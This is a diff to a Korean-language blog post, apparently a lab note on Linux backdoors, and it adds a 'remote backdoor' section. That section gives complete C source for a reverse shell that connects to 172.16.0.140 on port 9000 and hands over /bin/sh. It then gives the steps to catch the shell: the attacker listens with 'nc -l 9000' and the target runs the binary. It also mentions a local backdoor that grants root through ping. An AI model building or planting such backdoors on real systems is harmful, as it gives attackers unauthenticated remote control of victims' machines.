@@ -9,6 +9,8 @@
 
 <br>
 
+##### local backdoor      : 관리자의 권한을 취득
+
 구성도
 
 ![2022-10-18-01-구성도](../images/2022-10-18-LinuxBackdoor/2022-10-18-01-구성도.jpg)
@@ -223,6 +225,79 @@ ping 이 잘 동작되는데 인자가 ktest 가 따라오면 root 퍼미션을 
 ![2022-10-18-17-ping](../images/2022-10-18-LinuxBackdoor/2022-10-18-17-ping.jpg)
 
 ![2022-10-18-18-car](../images/2022-10-18-LinuxBackdoor/2022-10-18-18-car.jpg)
+
+<br>
+
+<br>
+
+<br>
+
+##### remote backdoor  : 인증없이 원격  접근 
+
+구성도
+
+![2022-10-18-21구성도](../images/2022-10-18-LinuxBackdoor/2022-10-18-21구성도.jpg)
+
+<br>
+
+백도어+쉘 소스코드 : revershell.c 만든후 컴파일
+
+```
+vim /root/revershell.c
+
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <errno.h>
+int main(int argc, char* argv[])
+{
+        struct sockaddr_in server_addr;
+        int server_sock;
+        int client_len;
+        char buf[80];
+        char rbuf[80];
+        char *cmd[2] = {"/bin/sh",(char *)0};
+        server_sock = socket(AF_INET, SOCK_STREAM, 6);
+        server_addr.sin_family =  AF_INET;
+        server_addr.sin_addr.s_addr = inet_addr("172.16.0.140");
+        server_addr.sin_port = htons(atoi("9000"));
+        client_len =  sizeof(server_addr);
+        connect(server_sock,(struct sockaddr *) &server_addr, client_len);
+        dup2(server_sock, 0);
+        dup2(server_sock, 1);
+        dup2(server_sock, 2);
+        execve("/bin/sh", cmd, 0);
+        return 0;
+}
+```
+
+![2022-10-18-19컴파일](../images/2022-10-18-LinuxBackdoor/2022-10-18-19컴파일.jpg)
+
+<br>
+
+공격자 -> nc -l 9000 실행
+
+```
+[root@localhost ~]# nc -l 9000 
+```
+
+<br>
+
+공격대상 -> revershell 실행
+
+```
+[root@localhost ~]# ./revershell
+```
+
+<br>
+
+공격자 -> 확인
+
+![2022-10-18-20확인](../images/2022-10-18-LinuxBackdoor/2022-10-18-20확인.jpg)
+
+공격자 에게  공격 대상과 연결 되면서 사용할 shell 이 제공됨  remote backdoor + shell 
 
 <br>
 
